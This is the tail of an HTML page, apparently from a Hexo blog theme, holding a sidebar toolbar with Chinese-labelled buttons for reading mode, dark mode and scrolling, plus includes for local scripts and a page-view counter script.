5.5.4-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4-b1"></script><script src="/js/main.js?v=5.5.4-b1"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
